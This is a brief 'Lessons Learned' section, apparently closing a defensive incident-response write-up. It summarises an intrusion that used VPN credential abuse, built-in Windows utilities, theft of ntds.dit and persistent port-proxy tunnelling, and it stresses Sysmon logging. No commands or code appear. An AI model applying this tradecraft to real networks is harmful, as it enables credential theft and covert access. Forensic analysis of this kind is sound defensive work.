
---

# Lessons Learned

The investigation demonstrated that VPN credential abuse combined with built-in Windows administrative utilities enabled rapid lateral movement and credential compromise. The attacker successfully leveraged trusted tools such as WMIC, netsh, PowerShell, and certutil to blend into legitimate administrative activity.

The compromise of `ntds.dit` represented a critical security incident capable of exposing all domain credentials. Additionally, the use of persistent port proxy configurations enabled covert tunneling that would survive password resets and system reboots.

Despite extensive anti-forensic activity, Sysmon telemetry provided sufficient visibility to reconstruct the full attack chain, emphasizing the importance of redundant logging strategies and centralized telemetry collection.

